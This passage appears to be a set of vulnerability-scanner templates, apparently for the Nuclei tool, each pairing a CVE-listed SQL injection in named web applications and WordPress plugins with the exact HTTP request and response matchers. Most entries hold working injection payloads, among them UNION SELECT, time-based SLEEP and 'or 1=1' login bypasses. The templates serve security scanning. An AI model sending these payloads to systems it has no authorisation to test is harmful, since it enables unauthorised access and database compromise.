Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCSxQll1eihcqgIgD

------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="username"

{{username}}
------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="password"

{{password}}
------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="login"


------WebKitFormBoundaryCSxQll1eihcqgIgD--

```
### Step - 2
```
POST /royal_event/btndates_report.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIGrD

------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="todate"

1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5("{{randstr}}"),0x1,0x2),NULL-- -
------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="search"

3
------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="fromdate"

01/01/2011
------WebKitFormBoundaryFboH5ITu7DsGIGrD--

```
### Matchers

**Type - word**
- words
    1. {{md5("{{randstr}}")}}

**Type - status**
- status
    1. 200

---
# Microfinance Management System 1.0 - SQL Injection
## Description
- Microfinance Management System 1.0 is susceptible to SQL Injection.

- severity - critical
- tags - microfinance,edb,cve,cve2022,sqli
## Requests
### Step - 1
```
GET /mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5({{num}}),1,2),NULL,NULL,NULL,NULL,NULL,NULL' HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# Complete Online Job Search System 1.0 - SQL Injection
## Description
- Complete Online Job Search System 1.0 contains a SQL injection vulnerability via /eris/admin/company/index.php?view=edit&id=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,sqli,eris,authenticated
## Requests
### Step - 1
```
POST /admin/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user_email={{username}}&user_pass={{password}}&btnLogin=

```
### Step - 2
```
GET /admin/company/index.php?view=edit&id=-3%27%20union%20select%201,md5({{num}}),3,4,5,6--+ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# BadgeOS < 3.7.1 - Unauthenticated SQL Injection
## Description
- The BadgeOS WordPress plugin through 3.7.0 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action, leading to an SQL Injection exploitable by unauthenticated users.

- severity - critical
- tags - cve2022,wp,unauth,sqli,cve,wp-plugin,badgeos,wpscan,wordpress
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5({{num}}),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

```
### Matchers

**Type - dsl**
- dsl
    1. status_code == 200
    2. contains(body, md5(num))
    3. contains(content_type, "application/json")
    4. contains(body, "badgeos-arrange-buttons")
- condition - and

---
# Page Views Count < 2.4.15 - Unauthenticated SQL Injection
## Description
- Unauthenticated SQL Injection in WordPress Page Views Count Plugin (versions < 2.4.15).

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,unauth
## Requests
### Step - 1
```
GET /?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5(num)}}

**Type - status**
- status
    1. 200

---
# Garage Management System 1.0 - SQL Injection
## Description
- Garage Management System 1.0 contains a SQL injection vulnerability in /login.php via manipulation of the argument username with input 1@a.com' AND (SELECT 6427 FROM (SELECT(SLEEP(5)))LwLu) AND 'hsvT'='hsvT. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,sourcecodester,garagemanagementsystem,sqli
## Requests
### Step - 1
```
@timeout: 10s
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=1@a.com' AND (SELECT 6427 FROM (SELECT(SLEEP(5)))LwLu) AND 'hsvT'='hsvT&password=412312&login=test2334

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=5

**Type - word**
- part - body
- words
    1. Garage Billing Software

**Type - status**
- status
    1. 200

---
# Casdoor 1.13.0 - Unauthenticated SQL Injection
## Description
- Casdoor version 1.13.0 suffers from a remote unauthenticated SQL injection vulnerability via the query API in Casdoor before 1.13.1 related to the field and value parameters, as demonstrated by api/get-organizations.
- severity - high
- tags - sqli,unauth,packetstorm,edb,cve,cve2022,casdoor
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)
### Matchers

**Type - regex**
- part - body
- regex
    1. XPATH syntax error.*&#39
    2. casdoor
- condition - and

**Type - status**
- status
    1. 200

---
# Dairy Farm Shop Management System 1.0 - SQL Injection
## Description
- Dairy Farm Shop Management System 1.0 contains multiple SQL injection vulnerabilities via the username and password parameters in the Admin panel. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,sqli,auth-bypass,edb
## Requests
### Step - 1
```
POST /dfsms/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=admin' or '1'='1&password=1&login=login

```
### Step - 2
```
GET /dfsms/add-category.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. <title>Add Product</title>
    2. <span>Admin
    3. DFSMS
- condition - and

**Type - status**
- status
    1. 200

---
# ARPrice Lite < 3.6.1 - Unauthenticated SQLi
## Description
- The Pricing Table WordPress plugin before 3.6.1 fails to properly sanitize and escape user supplied POST data before it is being interpolated in an SQL statement and then executed via an AJAX action available to unauthenticated users.

- severity - critical
- tags - unauth,wp,cve2022,wordpress,wp-plugin,arprice-responsive-pricing-table,sqli,wpscan,cve
## Requests
### Step - 1
```
@timeout: 10s
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)

```
### Step - 2
```
GET /wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration_1>=6
    2. status_code_1 == 200
    3. contains(content_type_1, "text/html")
    4. contains(body_2, "ArpPriceTable")
- condition - and

---
# Hospital Management System 1.0 - SQL Injection
## Description
- Hospital Management System 1.0 contains a SQL injection vulnerability via the editid parameter in /HMS/user-login.php.  An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,hms,cms,sqli,auth-bypass
## Requests
### Step - 1
```
POST /hms/user-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=

```
### Matchers

**Type - word**
- part - body
- words
    1. <title>User  | Dashboard</title>
    2. Book My Appointment
- condition - and

**Type - status**
- status
    1. 200

---
# Complete Online Job Search System 1.0 - SQL Injection
## Description
- Complete Online Job Search System 1.0 contains a SQL injection vulnerability via /eris/index.php?q=hiring&search=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?q=hiring&search=URC%27%20union%20select%201,2,3,4,5,6,7,8,9,md5({{num}}),11,12,13,14,15,16,17,18,19--+
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# Joomla! Core SQL Injection
## Description
- A SQL injection vulnerability in Joomla! 3.2 before 3.4.4 allows remote attackers to execute arbitrary SQL commands.
- severity - high
- tags - cve,cve2015,joomla,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5({{num}})),1)
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

---
# SQLiteManager - Text Display
## Description
- SQLiteManager panel contains inconsistent text display in title and text.
- severity - medium
- tags - misconfig,sqlite,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}/sqlite/
- {{BaseURL}}/sqlitemanager/
### Matchers

**Type - word**
- words
    1. <title>SQLiteManager</title>

**Type - status**
- status
    1. 200

---
